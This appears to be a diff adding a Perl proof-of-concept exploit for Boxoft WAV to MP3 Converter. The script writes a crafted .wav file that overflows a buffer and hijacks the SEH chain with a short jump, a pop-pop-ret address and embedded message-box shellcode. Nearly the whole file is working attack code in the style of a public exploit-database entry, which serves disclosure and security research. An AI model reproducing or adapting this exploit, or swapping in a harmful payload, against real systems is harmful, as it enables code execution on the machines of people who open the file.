@@ -1,0 +1,41 @@
+#Exploit Title: Boxoft wav to mp3 converter SEH bypass technique tested on Win7x64   
+# Date: 8-31-2015
+# Software Link: http://www.boxoft.com/wav-to-mp3/
+# Exploit Author: Robbie Corley
+# Contact: c0d3rc0rl3y@gmail.com
+# Website: 
+# Target: Windows 7 Enterprise x64
+# CVE: 
+# Category: Local Exploit
+#
+# Description:
+# A buffer overflow was found after constructing a .wav payload over 4000 characters and attempting to convert the payload to a .mp3 file
+
+my $buff = "\x41" x 4132;
+#my $nseh = "\x42" x 4;
+#my $seh = "\x43" x 4;
+my $endofbuff   = "\x41" x 5860;
+
+
+$nseh = "\xeb\x06\x90\x90";  # jump to shellcode
+$seh = pack('V',0x0040144c); # pop pop retn
+
+#MessageBox Shellc0de 
+#https://www.exploit-db.com/exploits/28996/
+
+my $shellcode =
+"\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42".
+"\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03".
+"\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b".
+"\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e".
+"\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c".
+"\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74".
+"\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe".
+"\x49\x0b\x31\xc0\x51\x50\xff\xd7";
+
+#$nops = "\x90" x 20; 
+
+open(myfile,'>crash3r.wav');
+
+print myfile $buff.$nseh.$seh.$shellcode.$endofbuff;
+close (myfile);
